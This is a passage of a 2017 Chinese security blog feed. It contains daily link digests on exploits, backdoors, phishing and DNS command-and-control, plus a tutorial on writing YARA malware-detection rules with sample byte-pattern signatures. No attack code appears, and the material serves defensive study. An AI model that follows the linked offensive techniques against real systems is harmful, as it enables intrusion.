<li>Hunting With Active Directory Replication Metadata<br><a href="https://posts.specterops.io/hunting-with-active-directory-replication-metadata-1dab2f681b19" target="_blank" rel="external">https://posts.specterops.io/hunting-with-active-directory-replication-metadata-1dab2f681b19</a></li>
<li>Syzygy - PE 文件的文件重写工具（Binary Rewriting），可以实现代码块分析和重构等功能<br><a href="http://doar-e.github.io/blog/2017/08/05/binary-rewriting-with-syzygy/" target="_blank" rel="external">http://doar-e.github.io/blog/2017/08/05/binary-rewriting-with-syzygy/</a></li>
<li>InfoCON - 专门收集各大信息安全会议资料的网站<br><a href="https://infocon.org/cons/" target="_blank" rel="external">https://infocon.org/cons/</a></li>
<li>FrauDroid - 一个精确的大规模自动化手机广告欺诈检测的方法<br><a href="https://arxiv.org/pdf/1709.01213.pdf" target="_blank" rel="external">https://arxiv.org/pdf/1709.01213.pdf</a></li>
<li>滥用 .htaccess 实现 Web 漏洞的利用<br><a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#104;&#116;&#x74;&#112;&#x73;&#x3a;&#47;&#47;&#109;&#x65;&#x64;&#105;&#x75;&#x6d;&#46;&#x63;&#x6f;&#109;&#47;&#64;&#105;&#110;&#115;&#x65;&#x63;&#x75;&#114;&#105;&#x74;&#x79;&#95;&#x39;&#50;&#52;&#x37;&#x37;&#47;&#117;&#x74;&#105;&#x6c;&#x69;&#x7a;&#105;&#110;&#x67;&#45;&#104;&#116;&#97;&#x63;&#x63;&#101;&#x73;&#115;&#x2d;&#x66;&#x6f;&#114;&#x2d;&#101;&#120;&#x70;&#108;&#x6f;&#x69;&#x74;&#97;&#116;&#x69;&#111;&#x6e;&#x2d;&#x70;&#x75;&#114;&#112;&#111;&#x73;&#x65;&#x73;&#45;&#x70;&#x61;&#114;&#116;&#x2d;&#x31;&#45;&#x35;&#55;&#51;&#51;&#x64;&#x64;&#55;&#102;&#99;&#56;&#101;&#98;">&#104;&#116;&#x74;&#112;&#x73;&#x3a;&#47;&#47;&#109;&#x65;&#x64;&#105;&#x75;&#x6d;&#46;&#x63;&#x6f;&#109;&#47;&#64;&#105;&#110;&#115;&#x65;&#x63;&#x75;&#114;&#105;&#x74;&#x79;&#95;&#x39;&#50;&#52;&#x37;&#x37;&#47;&#117;&#x74;&#105;&#x6c;&#x69;&#x7a;&#105;&#110;&#x67;&#45;&#104;&#116;&#97;&#x63;&#x63;&#101;&#x73;&#115;&#x2d;&#x66;&#x6f;&#114;&#x2d;&#101;&#120;&#x70;&#108;&#x6f;&#x69;&#x74;&#97;&#116;&#x69;&#111;&#x6e;&#x2d;&#x70;&#x75;&#114;&#112;&#111;&#x73;&#x65;&#x73;&#45;&#x70;&#x61;&#114;&#116;&#x2d;&#x31;&#45;&#x35;&#55;&#51;&#51;&#x64;&#x64;&#55;&#102;&#99;&#56;&#101;&#98;</a></li>
<li>Wireless IP Camera (P2P) WIFICAM 无线摄像头的多个高危漏洞详情<br><a href="https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html" target="_blank" rel="external">https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html</a></li>
<li>黑客免费提供的Cobian RAT中暗藏后门<br><a href="http://thehackernews.com/2017/09/backdoored-hacking-tools.html" target="_blank" rel="external">http://thehackernews.com/2017/09/backdoored-hacking-tools.html</a></li>
<li>如何制作基础认证钓鱼页面<br><a href="https://securitycafe.ro/2017/09/06/phishy-basic-authentication-prompts/" target="_blank" rel="external">https://securitycafe.ro/2017/09/06/phishy-basic-authentication-prompts/</a></li>
<li>JavaScript WebSocket Backdoor: 浏览器后门<br><a href="https://n0where.net/javascript-websocket-backdoor-browserbackdoor/" target="_blank" rel="external">https://n0where.net/javascript-websocket-backdoor-browserbackdoor/</a></li>
<li>Java-Deserialization-Cheat-Sheet  java反序列化<br><https: github.com="" grrrdog="" java-deserialization-cheat-sheet=""></https:></li>
<li>IPTables工作原理分析<br><https: n0where.net="" how-does-it-work-iptables=""></https:></li>
<li>Command and Control – DNS  DNS隧道<br><a href="https://pentestlab.blog/2017/09/06/command-and-control-dns/" target="_blank" rel="external">https://pentestlab.blog/2017/09/06/command-and-control-dns/</a></li>
<li>其它</li>
<li><p>Visual Studio 2015 中的 Visual C++<br><a href="https://msdn.microsoft.com/zh-cn/library/60k1461a.aspx" target="_blank" rel="external">https://msdn.microsoft.com/zh-cn/library/60k1461a.aspx</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">如果大学时候用这种教材学的话，应该会好很多吧。。。</div></pre></td></tr></table></figure>
</li>
<li><p>linux的静态编译和动态编译<br><a href="http://blog.csdn.net/l_yangliu/article/details/6951005" target="_blank" rel="external">http://blog.csdn.net/l_yangliu/article/details/6951005</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过gcc去理解动态链接和静态链接的区别</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;3gstudent/Pentest-Tips: A collection of pentest 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>yara使用说明</title>
    <link href="http://kevien.github.io/2017/09/06/yara%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
    <id>http://kevien.github.io/2017/09/06/yara使用说明/</id>
    <published>2017-09-06T08:55:40.000Z</published>
    <updated>2017-09-07T18:37:23.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><ul>
<li>yara工具用来帮助安全研究人员鉴别和对恶意软件进行分类的工具。我们可以通过编写规则来进行恶意软件的识别。<h4 id="yara-规则"><a href="#yara-规则" class="headerlink" title="yara 规则"></a>yara 规则</h4><a href="http://yara.readthedocs.io/en/v3.6.3/index.html" target="_blank" rel="external">最新规则官方文档V3.6.3</a><br><br>规则示例：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">rule silent_banker : banker</div><div class="line">&#123;</div><div class="line">    meta:</div><div class="line">        description = &quot;This is just an example&quot;</div><div class="line">        thread_level = 3</div><div class="line">        in_the_wild = true</div><div class="line">    strings:</div><div class="line">        $a = &#123;6A 40 68 00 30 00 00 6A 14 8D 91&#125;</div><div class="line">        $b = &#123;8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9&#125;</div><div class="line">        $c = &quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;</div><div class="line">    condition:</div><div class="line">        $a or $b or $c</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这个就是一个名为rule silent_banker的规则，其中banker是规则的tag字段(可以有多个tag)，meta字段是规则的描述信息，strings是规则字段，condition则是条件判断的字段，这个规则的意思就是只要满足了字符串或a或b或c就会命中规则。<br>这里只是一个简单的规则，规则的创建可以使用通配符、大小写非敏感的字符串、正则表达式、特殊的操作符号等其它的特征。<br>通过python使用yara<br><img src="/2017/09/06/yara使用说明/yarapython.png" alt=""><br><img src="/2017/09/06/yara使用说明/help.png" alt=""><br>yara语法<br><br>silent-_banker叫做identifiers，是大小写敏感的且不能超过128个字符，且不能用以下的关键词，因为这些是yara的关键词<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">all	and	any	ascii	at	condition	contains</div><div class="line">entrypoint	false	filesize	fullword	for	global	in</div><div class="line">import	include	int8	int16	int32	int8be	int16be</div><div class="line">int32be	matches	meta	nocase	not	or	of</div><div class="line">private	rule	strings	them	true	uint8	uint16</div><div class="line">uint32	uint8be	uint16be	uint32be	wide</div></pre></td></tr></table></figure></p>
<p>字符串可以是文本字符串也可以是十六进制，ascii类型的使用双引号包裹，十六进制字符串使用大括号包裹。<br><br>注释语法和c语言相同。<br></p>
<p>* 三种string；<br><br>1.文本类型字符串<br><br>2.十六进制字符串<br><br>3.正则表达式</p>
<ul>
<li>十六进制Example<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">rule AlternativesExample1</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">       $hex_string = &#123; F4 23 ( 62 B4 | 56 ) 45 &#125;</div><div class="line"></div><div class="line">    condition:</div><div class="line">       $hex_string</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>valid<br>F42362B445或者F4235645</p>
<ul>
<li>字符串Example<br><br>默认是敏感的,但是可以通过nocase关键字设置成不敏感的<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">rule CaseInsensitiveTextExample</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $text_string = &quot;foobar&quot; nocase</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $text_string</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这样Foobar, FOOBAR, and fOoBaR都会被匹配到。</p>
<ul>
<li><p>宽字节的匹配<br><br>一个字符占两个字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">rule WideCharTextExample1</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $wide_string = &quot;Borland&quot; wide</div><div class="line"></div><div class="line">    condition:</div><div class="line">       $wide_string</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>fullword关键词<br><br>rule WideCharTextExample1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $fullword_string = &quot;domain&quot; fullword</div><div class="line"></div><div class="line">    condition:</div><div class="line">       $fullword_string</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>www.mydomain.com  www.my-domain.com www.domain.com</p>
<ul>
<li><p>正则表达式<br><br>使用斜线包裹，而非双引号或者大括号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> rule RegExpExample1</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $re1 = /md5: [0-9a-fA-F]&#123;32&#125;/</div><div class="line">        $re2 = /state: (on|off)/</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $re1 and $re2</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>条件判断语句Conditions<br><br>可以没有特征strings但是不能没有strings字段<br><br>可以设定特征出现的次数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> rule CountExample</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $a = &quot;dummy1&quot;</div><div class="line">        $b = &quot;dummy2&quot;</div><div class="line"></div><div class="line">    condition:</div><div class="line">        #a == 6 and #b &gt; 10</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>偏移地址offset</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">rule InExample</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $a = &quot;dummy1&quot;</div><div class="line">        $b = &quot;dummy2&quot;</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $a in (0..100) and $b in (100..filesize)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>特征a出现在0-0x100偏移且特征b出现在0x100之后。</p>
<ul>
<li>文件大小<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"> rule FileSizeExample</div><div class="line">&#123;</div><div class="line">    condition:</div><div class="line">       filesize &gt; 200KB</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这个只能匹配文件，如果是运行着的程序的话，那么将永远不会匹配，因为这个时候filesize没有意义。</p>
<ul>
<li>特定位置的数据获取<br>PE文件的判断<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"> rule IsPE</div><div class="line">&#123;</div><div class="line">  condition:</div><div class="line">     // MZ signature at offset 0 and ...</div><div class="line">     uint16(0) == 0x5A4D and</div><div class="line">     // ... PE signature at offset stored in MZ header at 0x3C</div><div class="line">     uint32(uint32(0x3C)) == 0x00004550</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>PE文件结构中的前两个字节是DOS签名5A4D,即“MZ”。</p>
<ul>
<li><p>特征集合<br>rule OfExample1<br>{<br>strings:</p>
<pre><code>$a = &quot;dummy1&quot;
$b = &quot;dummy2&quot;
$c = &quot;dummy3&quot;
</code></pre><p>condition:</p>
<pre><code>2 of ($a,$b,$c)
</code></pre><p>}<br>满足两个特征即可</p>
</li>
</ul>
</li>
<li><p>引用其他规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">rule Rule1</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $a = &quot;dummy1&quot;</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $a</div><div class="line">&#125;</div><div class="line"></div><div class="line">rule Rule2</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $a = &quot;dummy2&quot;</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $a and Rule1</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>全局规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">global rule SizeLimit</div><div class="line">&#123;</div><div class="line">    condition:</div><div class="line">        filesize &lt; 2MB</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>规则标签<br>方便对输出的信息进行归类。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">rule TagsExample1 : Foo Bar Baz</div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line"></div><div class="line">rule TagsExample2 : Bar</div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>Metadata</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">rule MetadataExample</div><div class="line">&#123;</div><div class="line">    meta:</div><div class="line">        my_identifier_1 = &quot;Some string data&quot;</div><div class="line">        my_identifier_2 = 24</div><div class="line">        my_identifier_3 = true</div><div class="line"></div><div class="line">    strings:</div><div class="line">        $my_text_string = &quot;text here&quot;</div><div class="line">        $my_hex_string = &#123; E2 34 A1 C8 23 FB &#125;</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $my_text_string or $my_hex_string</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>模块引用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">import &quot;pe&quot;</div><div class="line"></div><div class="line">rule Test</div><div class="line">&#123;</div><div class="line">  strings:</div><div class="line">      $a = &quot;some string&quot;</div><div class="line"></div><div class="line">  condition:</div><div class="line">      $a and pe.entry_point == 0x1000</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>文件包含</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include &quot;other.yar&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul>
<li>容易踩坑的点<br>当扫描的是某个进程文件时候，这个时候是没有filesize属性的，也就永远不会满足的。此外还有通过文件偏移来判断PE也是不可行的。</li>
<li>web<br><a href="https://github.com/Tigzy/yaraeditor" target="_blank" rel="external">https://github.com/Tigzy/yaraeditor</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="http://www.freebuf.com/articles/system/26373.html" target="_blank" rel="external">恶意软件模式匹配利器 – YARA</a><br><a href="http://www.freebuf.com/articles/96903.html" target="_blank" rel="external">YARA：抗击恶意代码的神兵利器</a><br><a href="https://www.aldeid.com/wiki/Pescanner" target="_blank" rel="external">PEScanner</a><br><a href="https://github.com/Neo23x0/yarGen" target="_blank" rel="external">yara规则自动生成</a><br><a href="https://countuponsecurity.com/tag/pescanner-py/" target="_blank" rel="external">UNLEASHING YARA – PART 2</a><br><a href="http://www.freebuf.com/sectool/92399.html" target="_blank" rel="external">教你构建自己的yara数据库</a><br><a href="https://github.com/Neo23x0/yarAnalyzer" target="_blank" rel="external">yarAnalyzer</a><br><a href="http://www.aptno1.com/YC/249.html" target="_blank" rel="external">yara简介及API解析</a><br><a href="http://blog.csdn.net/wowolook/article/details/44307283" target="_blank" rel="external">两个开源恶意代码的查杀引擎 clamav yara</a><br><a href="http://bruteforcelab.com/yara-a-beginners-guide.html" target="_blank" rel="external">http://bruteforcelab.com/yara-a-beginners-guide.html</a><br><a href="https://blog.malwarebytes.com/threat-analysis/2013/10/using-yara-to-attribute-malware/" target="_blank" rel="external">https://blog.malwarebytes.com/threat-analysis/2013/10/using-yara-to-attribute-malware/</a><br><a href="https://securityintelligence.com/signature-based-detection-with-yara/" target="_blank" rel="external">https://securityintelligence.com/signature-based-detection-with-yara/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;yara工具用来帮助安全研究人员鉴别和对恶意软件进行分类的工具。我们可以通过编写规则来进行恶意软件的识别。&lt;h4 id=&quot;yar
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170906安全动态</title>
    <link href="http://kevien.github.io/2017/09/06/20170906%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/06/20170906安全动态/</id>
    <published>2017-09-06T03:55:40.000Z</published>
    <updated>2017-09-07T06:36:09.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>Struts2 S2-052 RCE分析与利用<br><a href="https://paper.seebug.org/383/" target="_blank" rel="external">https://paper.seebug.org/383/</a></li>
<li>使用 QL 寻找 Apache Struts 中的远程代码执行漏洞(CVE-2017-9805)<br><a href="https://lgtm.com/blog/apache_struts_CVE-2017-9805" target="_blank" rel="external">https://lgtm.com/blog/apache_struts_CVE-2017-9805</a><br><a href="https://xianzhi.aliyun.com/forum/read/2067.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/2067.html</a></li>
<li>CSS-in-JS 打破了 JS 和 CSS 之间的边界，为 CSS 注入提供了新的攻击界面<br><a href="https://reactarmory.com/answers/how-can-i-use-css-in-js-securely" target="_blank" rel="external">https://reactarmory.com/answers/how-can-i-use-css-in-js-securely</a></li>
<li>HEVD Stack Overflow 漏洞的利用，包括对 GS stack cookies 特性的绕过<br><a href="https://reactarmory.com/answers/how-can-i-use-css-in-js-securely" target="_blank" rel="external">https://reactarmory.com/answers/how-can-i-use-css-in-js-securely</a></li>
<li>联想笔记本（还有其他品牌）的 Synaptics 触控板驱动存在一个 Bug，每秒钟会扫描一次系统<br><a href="https://randomascii.wordpress.com/2017/09/05/hey-synaptics-can-you-please-stop-polling" target="_blank" rel="external">https://randomascii.wordpress.com/2017/09/05/hey-synaptics-can-you-please-stop-polling</a></li>
<li>如何 Dump 一个 Flash 芯片，来自 quarkslab<br><a href="https://blog.quarkslab.com/flash-dumping-part-i.html" target="_blank" rel="external">https://blog.quarkslab.com/flash-dumping-part-i.html</a></li>
<li>恶意的 Chrome 扩展程序窃取 Roblox 游戏币，通过 Discord 发送窃取的 Cookie<br><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/malicous-chrome-extensions-stealing-roblox-game-currency-sending-cookies-via-discord/" target="_blank" rel="external">http://blog.trendmicro.com/trendlabs-security-intelligence/malicous-chrome-extensions-stealing-roblox-game-currency-sending-cookies-via-discord/</a></li>
<li>ypass macOS 10.13 内核新加的 “Secure Kernel Extension Loading” 内核模块加载保护特性<br><a href="https://objective-see.com/blog/blog_0x21.html" target="_blank" rel="external">https://objective-see.com/blog/blog_0x21.html</a></li>
<li>MTuner - 一个可用于 Windows, PS4, PS3 上的 memory profiler、内存泄漏分析工具<br><a href="https://github.com/milostosic/MTuner" target="_blank" rel="external">https://github.com/milostosic/MTuner</a></li>
<li>domain_analyzer - 一个可以搜寻域名的各类信息并分析安全问题的工具<br><a href="https://github.com/eldraco/domain_analyzer" target="_blank" rel="external">https://github.com/eldraco/domain_analyzer</a></li>
<li>Linux(x86)栈溢出exploit开发技巧“return-to-libc”<br><a href="https://mp.weixin.qq.com/s/W1lUMJHVT_6_7GYNsxWdWA" target="_blank" rel="external">https://mp.weixin.qq.com/s/W1lUMJHVT_6_7GYNsxWdWA</a></li>
<li>DIY监控程序: 滥用Apple的Call Relay协议<br><a href="http://www.martinvigo.com/diy-spy-program-abusing-apple-call-relay-protocol/" target="_blank" rel="external">http://www.martinvigo.com/diy-spy-program-abusing-apple-call-relay-protocol/</a></li>
<li>Mastercard互联网网关服务：Hashing设计缺陷<br><a href="http://tinyhack.com/2017/09/05/mastercard-internet-gateway-service-hashing-design-flaw/" target="_blank" rel="external">http://tinyhack.com/2017/09/05/mastercard-internet-gateway-service-hashing-design-flaw/</a></li>
<li>滥用可写Windows服务<br><a href="https://blog.didierstevens.com/2017/09/05/abusing-a-writable-windows-service/" target="_blank" rel="external">https://blog.didierstevens.com/2017/09/05/abusing-a-writable-windows-service/</a></li>
<li>通过静态分析检测Python Web应用程序中漏洞<br><a href="https://github.com/python-security/pyt" target="_blank" rel="external">https://github.com/python-security/pyt</a></li>
<li>Re-enjoying the ActiveX (and others) Fun in Chinese Customized Browsers<br><a href="https://justhaifei1.blogspot.com/2017/09/re-enjoying-activex-and-others.html" target="_blank" rel="external">https://justhaifei1.blogspot.com/2017/09/re-enjoying-activex-and-others.html</a></li>
<li>security things in Linux v4.13<br><a href="https://outflux.net/blog/archives/2017/09/05/security-things-in-linux-v4-13/" target="_blank" rel="external">https://outflux.net/blog/archives/2017/09/05/security-things-in-linux-v4-13/</a></li>
<li>Remotely Dump Linux RAM: LiMEaide<br><a href="https://n0where.net/remotely-dump-linux-ram-limeaide/" target="_blank" rel="external">https://n0where.net/remotely-dump-linux-ram-limeaide/</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4>macOS版微信竟可以这样消息防撤回<br><a href="http://www.jianshu.com/p/7f65287a2e7a" target="_blank" rel="external">http://www.jianshu.com/p/7f65287a2e7a</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Struts2 S2-052 RCE分析与利用&lt;br&gt;&lt;a href=&quot;https://pape
    
    </summary>
    
    
  </entry>
  
</feed>
